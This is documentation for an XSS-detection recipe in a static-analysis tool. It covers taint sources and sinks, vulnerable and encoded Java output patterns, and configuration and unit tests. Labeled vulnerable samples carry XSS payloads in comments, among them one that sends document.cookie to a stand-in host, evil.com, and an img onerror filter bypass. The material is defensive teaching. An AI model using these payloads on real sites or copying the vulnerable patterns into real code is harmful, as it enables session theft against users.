---
description: Detect and prevent Cross-Site Scripting (XSS) vulnerabilities in web applications
---

# Cross-Site Scripting (XSS) Detection

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal cookies, hijack sessions, deface websites, or redirect users to malicious sites. OpenRewrite's XSS detection uses taint analysis to find where untrusted data flows into HTML output without proper encoding.

## Understanding XSS Vulnerabilities

Think of XSS like graffiti on a public bulletin board. If anyone can post messages without review, malicious users might post content that tricks other readers. In web applications, this "graffiti" is JavaScript code that executes in victims' browsers.

### Types of XSS

```java
// Reflected XSS - immediate reflection of user input
String name = request.getParameter("name");
response.getWriter().write("<h1>Hello " + name + "</h1>");
// Attack: ?name=<script>alert('XSS')</script>

// Stored XSS - persisted malicious content  
String comment = request.getParameter("comment");
database.save(comment);
// Later...
String saved = database.getComment();
response.getWriter().write("<div>" + saved + "</div>");

// DOM XSS - client-side vulnerability (not covered by this analysis)
// <script>
//   document.getElementById('output').innerHTML = location.hash.substring(1);
// </script>
```

## How OpenRewrite Detects XSS

The `FindXssVulnerability` recipe tracks untrusted data from various sources to HTML output sinks:

### 1. Identifying Sources

```java
// Web input sources
request.getParameter("search")          // URL parameters
request.getHeader("User-Agent")         // HTTP headers
request.getCookies()[0].getValue()      // Cookie values
request.getQueryString()                // Full query string
request.getPathInfo()                   // URL path segments

// Database sources (for stored XSS)
resultSet.getString("user_comment")     // Database content
entity.getUserContent()                 // JPA entities

// File sources
Files.readString(uploadedFile)          // User uploads
properties.getProperty("user.data")     // Configuration
```

### 2. Tracking Through Transformations

```java
String input = request.getParameter("q");           // TAINTED
String trimmed = input.trim();                      // TAINTED
String message = "You searched for: " + trimmed;    // TAINTED
String wrapped = "<div>" + message + "</div>";     // TAINTED
response.getWriter().write(wrapped);                // XSS VULNERABILITY!
```

### 3. Identifying HTML Output Sinks

```java
// Servlet/JSP outputs
response.getWriter().write(html)
response.getWriter().print(html)
response.getWriter().println(html)
response.getOutputStream().write(html.getBytes())
out.print(html)  // JSP out object

// Spring MVC model attributes (when not escaped by view)
model.addAttribute("userContent", taintedData)
modelAndView.addObject("html", taintedData)

// Template engines (when raw output is used)
model.put("rawHtml", taintedData)  // If template uses {{{rawHtml}}}
```

## Common XSS Patterns

### Basic Reflection

```java
// VULNERABLE - Direct reflection
@GetMapping("/search")
public void search(HttpServletRequest request, HttpServletResponse response) 
        throws IOException {
    String query = request.getParameter("q");
    response.getWriter().write(
        "<html><body>Search results for: " + query + "</body></html>"
    );
}
// Attack: ?q=<script>document.location='http://evil.com?c='+document.cookie</script>
```

### Attribute Injection

```java
// VULNERABLE - Unquoted attributes
String color = request.getParameter("color");
response.getWriter().write("<div style=background:" + color + ">Content</div>");
// Attack: ?color=red%20onmouseover=alert(1)
// Result: <div style=background:red onmouseover=alert(1)>Content</div>

// VULNERABLE - Even with quotes
String title = request.getParameter("title");
response.getWriter().write("<div title='" + title + "'>Content</div>");
// Attack: ?title=x' onmouseover='alert(1)
```

### JavaScript Context

```java
// VULNERABLE - Data in JavaScript
String username = request.getParameter("user");
response.getWriter().write(
    "<script>var user = '" + username + "'; processUser(user);</script>"
);
// Attack: ?user=x'; alert(1); //
// Result: <script>var user = 'x'; alert(1); //'; processUser(user);</script>
```

### JSON Injection

```java
// VULNERABLE - Improper JSON encoding
String data = request.getParameter("data");
response.getWriter().write(
    "<script>var config = {data: '" + data + "'};</script>"
);
// Attack: ?data=x'}; alert(1); //
```

## Safe Patterns and Remediation

### HTML Entity Encoding

The primary defense against XSS.
```java
// SAFE - Using OWASP Java Encoder
import org.owasp.encoder.Encode;

@GetMapping("/search")
public void search(HttpServletRequest request, HttpServletResponse response) 
        throws IOException {
    String query = request.getParameter("q");
    response.getWriter().write(
        "<html><body>Search results for: " + 
        Encode.forHtml(query) + 
        "</body></html>"
    );
}

// SAFE - Context-specific encoding
String userContent = request.getParameter("content");
response.getWriter().write(
    "<div title='" + Encode.forHtmlAttribute(userContent) + "'>" +
    Encode.forHtml(userContent) + 
    "</div>"
);
```

### Using Framework Protection

Modern frameworks provide automatic escaping.
```java
// SAFE - Spring with Thymeleaf (auto-escapes by default)
@GetMapping("/profile")
public String profile(@RequestParam String name, Model model) {
    model.addAttribute("username", name);
    return "profile";  // profile.html uses [[${username}]]
}

// SAFE - JSP with JSTL (c:out escapes by default)
// <c:out value="${param.userInput}"/>

// SAFE - Spring Security's tag library
// <sec:authentication property="principal.username" htmlEscape="true"/>
```

### Content Security Policy

Defense in depth with CSP.
```java
// Add CSP header to prevent inline scripts
@Component
public class SecurityHeadersFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        httpResponse.setHeader("Content-Security-Policy", 
            "default-src 'self'; script-src 'self' 'nonce-" + generateNonce() + "'");
        chain.doFilter(request, response);
    }
}
```

### Context-Aware Encoding

Different contexts require different encoding.
```java
public class SafeHtmlBuilder {
    public String buildHtml(UserData data) {
        return new StringBuilder()
            // HTML context
            .append("<div>").append(Encode.forHtml(data.getName())).append("</div>")
            
            // Attribute context  
            .append("<input value='").append(Encode.forHtmlAttribute(data.getValue())).append("'>")
            
            // JavaScript context
            .append("<script>var data = ").append(Encode.forJavaScript(data.getJson())).append(";</script>")
            
            // URL context
            .append("<a href='/user/").append(Encode.forUriComponent(data.getId())).append("'>Link</a>")
            
            // CSS context
            .append("<style>.user { color: ").append(Encode.forCssString(data.getColor())).append("; }</style>")
            
            .toString();
    }
}
```

## Advanced XSS Detection Features

### Stored XSS Detection

Tracks tainted data through persistence layers.
```java
// Phase 1: Malicious data stored
public void saveComment(HttpServletRequest request) {
    String comment = request.getParameter("comment");  // TAINTED
    Comment entity = new Comment();
    entity.setText(comment);                           // Taint tracked to field
    commentRepository.save(entity);                    // Persisted tainted data
}

// Phase 2: Vulnerable display (potentially in different request)
public void displayComments(HttpServletResponse response) {
    List<Comment> comments = commentRepository.findAll();
    for (Comment comment : comments) {
        // OpenRewrite tracks that comment.getText() may contain tainted data
        response.getWriter().write("<div>" + comment.getText() + "</div>"); // XSS!
    }
}
```

### Rich Content Handling

Detecting XSS in rich content scenarios.
```java
// VULNERABLE - Allowing some HTML
public String processRichText(String userHtml) {
    // Dangerous: only removes script tags
    return userHtml.replaceAll("<script.*?>.*?</script>", "");
    // Attacker can use: <img src=x onerror=alert(1)>
}

// SAFER - Using a sanitization library
public String processRichText(String userHtml) {
    PolicyFactory policy = new HtmlPolicyBuilder()
        .allowElements("p", "b", "i", "em", "strong")
        .allowAttributes("href").onElements("a")
        .requireRelNofollowOnLinks()
        .toFactory();
    return policy.sanitize(userHtml);
}
```

### Template Injection Detection

Finding XSS in template engines.
```java
// VULNERABLE - User controls template
public String renderTemplate(String templateName, Model model) {
    String template = request.getParameter("template");  // User controlled!
    return templateEngine.process(template, model);      // Template injection
}

// VULNERABLE - Unsafe template expressions
model.addAttribute("userExpression", request.getParameter("expr"));
// Template: <div th:utext="${userExpression}"></div>  // Unescaped output!
```

## Recipe Configuration

### Basic Usage

```yaml
# In rewrite.yml
---
type: specs.openrewrite.org/v1beta/recipe
name: com.example.XssScan
recipeList:
  - org.openrewrite.analysis.java.security.FindXssVulnerability
```

### Custom XSS Detection

Extend for framework-specific patterns.
```java
public class CustomXssRecipe extends FindXssVulnerability {
    @Override
    protected XssSpec createSpec() {
        return new XssSpec() {
            @Override
            public boolean isSink(Tree tree) {
                if (tree instanceof J.MethodInvocation) {
                    J.MethodInvocation method = (J.MethodInvocation) tree;
                    
                    // Custom template engine
                    if ("renderUnsafe".equals(method.getSimpleName())) {
                        return true;
                    }
                    
                    // Custom response writer
                    if ("writeHtmlResponse".equals(method.getSimpleName())) {
                        return true;
                    }
                }
                return super.isSink(tree);
            }
            
            @Override
            public boolean isSanitizer(J.MethodInvocation method) {
                // Custom sanitization method
                if ("sanitizeHtml".equals(method.getSimpleName())) {
                    return true;
                }
                return super.isSanitizer(method);
            }
        };
    }
}
```

## Framework-Specific Considerations

### Spring MVC

```java
// SAFE - Spring automatically escapes in views
@Controller
public class UserController {
    @GetMapping("/user")
    public String user(@RequestParam String name, Model model) {
        model.addAttribute("name", name);
        return "user";  // user.html with ${name} is auto-escaped
    }
}

// VULNERABLE - Bypassing escaping
@GetMapping("/raw")
@ResponseBody
public String raw(@RequestParam String html) {
    return "<html><body>" + html + "</body></html>";  // No escaping!
}
```

### JSP Best Practices

```jsp
<%-- VULNERABLE - Direct expression --%>
<%= request.getParameter("name") %>

<%-- VULNERABLE - Unescaped EL --%>
<div>${param.userInput}</div>

<%-- SAFE - Using c:out --%>
<c:out value="${param.userInput}"/>

<%-- SAFE - Using fn:escapeXml --%>
${fn:escapeXml(param.userInput)}
```

### React/Angular Integration

When building APIs for SPAs.
```java
// SAFE - Return JSON, let framework handle rendering
@RestController
public class ApiController {
    @GetMapping("/api/user")
    public UserDto getUser(@RequestParam String id) {
        // Return data, not HTML
        return new UserDto(id, getUserName(id));
    }
}

// Frontend handles encoding:
// React: {userData.name} // Auto-escaped
// Angular: {{userData.name}} // Auto-escaped
```

## Testing XSS Detection

### Unit Tests

```java
@Test
void detectsBasicXss() {
    rewriteRun(
        java("""
            import javax.servlet.http.*;
            import java.io.IOException;
            
            class XssServlet extends HttpServlet {
                void doGet(HttpServletRequest req, HttpServletResponse resp) 
                        throws IOException {
                    String name = req.getParameter("name");
                    ~~>resp.getWriter().write("<h1>Hello " + name + "</h1>");
                }
            }
            """)
    );
}

@Test
void allowsProperlyEncodedOutput() {
    rewriteRun(
        java("""
            import javax.servlet.http.*;
            import java.io.IOException;
            import org.owasp.encoder.Encode;
            
            class SafeServlet extends HttpServlet {
                void doGet(HttpServletRequest req, HttpServletResponse resp) 
                        throws IOException {
                    String name = req.getParameter("name");
                    resp.getWriter().write("<h1>Hello " + Encode.forHtml(name) + "</h1>");
                }
            }
            """)
    );
}
```

## Common Challenges

### False Positives

```java
// Might be flagged but is actually safe
public void writeJson(HttpServletResponse response, Object data) {
    response.setContentType("application/json");
    // JSON encoding prevents XSS when Content-Type is set correctly
    response.getWriter().write(gson.toJson(data));
}

// Suppress with annotation if needed
@SuppressWarnings("XSS")
public void trustedHtmlOutput(String trustedHtml) {
    // Document why this is safe
    response.getWriter().write(trustedHtml);
}
```

### Complex Data Flows

```java
// Taint through collections and transformations
List<String> inputs = new ArrayList<>();
inputs.add(request.getParameter("item1"));  // Tainted list
inputs.add(request.getParameter("item2"));

String html = inputs.stream()
    .map(item -> "<li>" + item + "</li>")  // Still tainted!
    .collect(Collectors.joining());

response.getWriter().write("<ul>" + html + "</ul>");  // XSS!
```

## Performance Considerations

XSS detection is typically fast because:
1. **Focused on I/O**: Only analyzes request handling and response generation
2. **Early termination**: Stops tracking when data is sanitized
3. **Common patterns**: Optimized for typical web frameworks

## Next Steps

- [SQL Injection](sql-injection.md) - Similar taint analysis for database queries
- [Command Injection](command-injection.md) - OS command vulnerabilities

:::tip Defense in Depth
XSS prevention requires multiple layers: input validation, output encoding, Content Security Policy, and secure frameworks. Automated detection helps but isn't a complete solution.
:::
